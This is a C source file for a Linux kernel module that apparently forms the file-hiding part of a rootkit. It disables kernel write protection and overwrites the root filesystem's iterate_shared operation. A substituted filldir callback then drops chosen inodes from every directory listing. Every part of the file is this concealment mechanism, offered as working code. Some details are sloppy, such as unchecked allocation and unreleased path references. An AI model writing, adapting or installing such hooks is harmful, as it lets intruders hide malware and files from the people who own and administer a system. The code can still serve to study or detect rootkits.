#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h> // kmalloc
#include <linux/fs.h>   // filp_open, filp_close.
#include <linux/list.h>
#include <linux/namei.h> // kern_path

#include <stdbool.h>
#include <stddef.h>

#include "util.h"
#include "hide_file.h"

#define ROOT_PATH "/"

static int (*real_iterate)(struct file *filp, struct dir_context *ctx);
static int (*real_filldir)(struct dir_context *ctx,
                           const char *name, int namlen,
                           loff_t offset, u64 ino, unsigned d_type);

static int fake_iterate(struct file *filp, struct dir_context *ctx);
static int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                        loff_t offset, u64 ino, unsigned d_type);
static void set_file_op(struct file_operations *f_op, size_t op_offset, void *new, void **old);

static LIST_HEAD(hidden_file_list_head); //初始化链表头
static struct file_operations *file_operations_ptr;

/* private structure */
struct file_node
{
    unsigned long ino;
    struct list_head list;
};

bool hide_file_init(void)
{
    struct path path;
    if (kern_path(ROOT_PATH, LOOKUP_FOLLOW, &path))
    {
        fm_info("Can't access file /");
        return false;
    }
    fm_info("Succeeded in opening: %s\n", ROOT_PATH);
    file_operations_ptr = (struct file_operations *)path.dentry->d_parent->d_inode->i_fop;

    set_file_op(file_operations_ptr, offsetof(struct file_operations, iterate_shared), fake_iterate, (void **)&real_iterate);
    return true;
}

void hide_file_exit(void)
{
    struct file_node *entry = NULL, *next_entry = NULL;

    set_file_op(file_operations_ptr, offsetof(struct file_operations, iterate_shared), real_iterate, NULL);

    fm_info("Restore file_operation success\n");

    list_for_each_entry_safe(entry, next_entry, &hidden_file_list_head, list)
    {
        list_del(&entry->list);
        kfree(entry);
    }
}

static void set_file_op(struct file_operations *f_op, size_t op_offset, void *new_ptr, void **old_ptr)
{
    // 保存旧的 file_operations
    if (old_ptr)
    {
        *old_ptr = *(void **)((char *)f_op + op_offset);
        fm_info("Save old_ptr: %p\n", *old_ptr);
    }

    fm_info("Changing file_op->%p to %p.\n", (void *)op_offset, new_ptr);
    disable_wp();
    *(void **)((char *)f_op + op_offset) = new_ptr;
    enable_wp();
}

bool hide_file(const char *file_name)
{
    struct file_node *node = NULL;
    struct path path;

    // 保存要隐藏的文件对应的 inode
    if (kern_path(file_name, LOOKUP_FOLLOW, &path))
    {
        fm_info("Can't access file: %s", file_name);
        return false;
    }
    node = kmalloc(sizeof(struct file_node), GFP_KERNEL);
    node->ino = path.dentry->d_inode->i_ino;

    // 添加节点
    list_add_tail(&node->list, &hidden_file_list_head);
    fm_info("Add hide file: %s", file_name);
    return true;
}

bool unhide_file(const char *file_name)
{
    struct file_node *entry = NULL, *next_entry = NULL;

    struct path path;
    unsigned int ino = 0;

    if (kern_path(file_name, LOOKUP_FOLLOW, &path))
    {
        fm_info("Can't access file: %s", file_name);
        return false;
    }

    ino = path.dentry->d_inode->i_ino;

    list_for_each_entry_safe(entry, next_entry, &hidden_file_list_head, list)
    {
        if (entry->ino == ino)
        {
            fm_info("Unhiding: %s", file_name);
            list_del(&entry->list);
            kfree(entry);
            return true;
        }
    }
    return false;
}

static int fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}

static int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                        loff_t offset, u64 ino, unsigned d_type)
{
    struct file_node *node = NULL;

    list_for_each_entry(node, &hidden_file_list_head, list)
    {
        if (node->ino == ino)
        {
            fm_info("Hiding: %s", name);
            return 0;
        }
    }
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}